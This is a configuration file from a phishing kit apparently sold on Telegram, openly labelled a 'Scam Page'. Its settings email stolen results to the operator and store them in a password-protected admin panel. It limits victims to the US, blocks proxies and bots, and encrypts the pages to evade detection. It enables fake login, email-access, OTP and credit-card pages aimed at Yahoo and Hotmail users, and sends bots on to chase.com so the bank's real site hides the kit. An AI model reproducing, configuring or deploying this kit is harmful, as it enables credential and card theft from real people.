<?php 
/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
telegram => @zae3m
Thanks For Buying My Scam Page
Copyright all Reserved to X-Sniper Page
*/
	// ================================= //
	/*  Send Result To Email */
		$sendToEmail = "true";   // true // False
		$yourEmail ="admin@zae3m.com";  // One Email
	// ==========Admin 	Panel============ //
		$saveInAdminPanel = "true";  //true // false /admin
		$adminPanelPass = "Zae3m";
	// ================================= //
		$YourName= "H-5573"; //Your Name
	// ================================= //
		$redirect = "false";   // Check Redirect
		$redirectFrom = "aol";  // Domain where you upload Redirect
	// ================================= //
		/*  Trick About Send */
		$emailGrabber = "false";   // Should Send as This https://link.com?email=elzer@example.com 
		$accessOneTime = "false";  // Access one Time From Email Grabber 
		$yourEmailGrabber = "";  // Your email To allow Enter More than one
		$listSent = "false";   //  Should Send as This https://link.com?email=elzer@example.com   And Put Your list in (priv/emailList.txt)
	// ================================= //
		$countryBlock = "true";  // If You Want To Access CCountry You Choose To Go Scam Page 
		$allowdCountry = "us";  // write one Country
		$yourIPCountry = "197.32.80.173"; // Allow Your Ip To Enter from any Country 
	// ================================= //
		$blockProxy = "true"; 	// If you don`t want to Block Proxy false to true (Free API)
	// ================================= //
		$encrypt_html = "true"; // If you don`t want to encrypt pages hange from true to false
	// ================================= //
		$accessOneTimeIp = "false"; // Access one Time by ip
		$yourIPAceess = "197.32.80.173"; // Allow Your Ip To Enter More than One Time
	// ========= Pages =========== //
		$Block_page = "false"; //Show Block Page 2nd page => true / false
		$success_page = "true";  //Show Success Page or Redirect to Bank    => true Or false
		$otp = "true";  //OTP Page Yahoo  
		$allDomains = 'false';
		$domainsOTP = ['yahoo','hotmail'];
		$timeWaiting = "30";  //OTP Page Yahoo  Waiting sms page (second)
	// ======= Double Pages ======= //
		$doubleLogin = "true";  // Login Page
		$doubleAccess = "true";  // Email Access Page
		$doubleCredit = "false";  // Credit Card Page
	// =======Bots Redirect ======= //
		$redirectLink = "https://chase.com"; // Put Link Here


